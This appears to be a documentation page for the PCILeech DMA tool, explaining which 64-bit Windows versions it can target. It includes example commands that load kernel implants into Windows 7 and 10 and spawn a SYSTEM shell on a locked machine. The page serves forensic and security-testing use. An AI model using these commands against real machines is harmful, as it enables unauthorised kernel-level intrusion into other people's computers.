---
outline: [2,3]
---



## Target operating system: Windows (64-bit)

PCILeech is able to target 64-bit Windows versions with varying degrees of success. PCILeech is not able to target 32-bit Windows versions or secure operating system parts (secure kernel) on systems already booted running Virtualization based secure.

If possible to target the Windows system a wide range of kernel modules may be used. Also it may be possible to target the system with user-mode injections.

Even though PCILeech may not be able to target the specific operating system memory dumping may still be possible.

***

### Examples:

Load a kernel module into Windows 7 by using the default memory scan technique.
* ` pcileech kmdload -kmd win7x64 `

Load a kernel module into Windows 10. Compatible with VBS/VTL0 only if "Protection of Code Integrity" is not enabled. This technique may be unstable on the most recent Windows 10 versions.
* ` pcileech kmdload -kmd WIN10_X64 `

Load a kernel module into Windows 10. Compatible with VBS/VTL0 only if "Protection of Code Integrity" is not enabled. This requires the windows-only [`vmm.dll`](https://github.com/ufrisk/MemProcFS/releases/latest) from [MemProcFS](https://github.com/ufrisk/MemProcFS) to exist alongside PCILeech.
* ` pcileech.exe kmdload -kmd WIN10_X64_3 `

Load a kernel module into Windows 10 by targeting the page table of the ntfs.sys driver signed on 2016-03-29.
* ` pcileech kmdload -kmd win10x64_ntfs_20160329 -pt `

Spawn a system shell on the target system (system needs to be locked and kernel module must be loaded). In this example the kernel module is loaded at address: 0x7fffe000.
* ` pcileech wx64_pscmd -kmd 0x7fffe000 `

In addition to the examples below please find additional built-in commands and Windows compatible implants starting with wx64 when executing `pcileech` without any parameters.